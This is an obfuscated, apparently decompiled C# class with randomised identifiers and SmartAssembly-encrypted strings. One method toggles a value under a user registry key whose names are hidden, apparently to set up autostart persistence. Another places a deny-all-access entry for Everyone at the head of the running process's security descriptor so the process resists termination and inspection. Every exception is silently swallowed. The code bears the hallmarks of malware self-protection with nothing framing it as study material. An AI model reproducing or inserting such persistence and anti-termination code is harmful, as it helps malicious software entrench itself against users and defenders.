using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace gTywbHaKSaZFRYP;

internal sealed class hJOuphokktBFxHG
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr qbzWqHUCMT, int IBxcpPCxqvZ, [Out] byte[] OFnBrapqKtz, uint AQNiSvndDEwg, out uint qYHMakNmiHsko);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr XmuXrOqrPqxEjfA, int kZFHmEmgjhIU, [In] byte[] PosgKzTkkfy);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void zpuVZwdEdgd(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(getString_0(107404092));
			if (bool_0 && registryKey.GetValue(getString_0(107403983)) != null)
			{
				registryKey.DeleteValue(getString_0(107403983));
			}
			else
			{
				registryKey.SetValue(getString_0(107403983), getString_0(107407218));
			}
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor eBumZpNevdvUXr(IntPtr intptr_0)
	{
		byte[] oFnBrapqKtz = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, oFnBrapqKtz, 0u, out var qYHMakNmiHsko);
		if ((long)qYHMakNmiHsko > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, oFnBrapqKtz = new byte[qYHMakNmiHsko], qYHMakNmiHsko, out qYHMakNmiHsko))
		{
			return null;
		}
		return new RawSecurityDescriptor(oFnBrapqKtz, 0);
	}

	private void RqqoSoGSdwyEahoi(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void jGgKhVFnpXmD()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = eBumZpNevdvUXr(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			RqqoSoGSdwyEahoi(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static hJOuphokktBFxHG()
	{
		Strings.CreateGetStringDelegate(typeof(hJOuphokktBFxHG));
	}
}
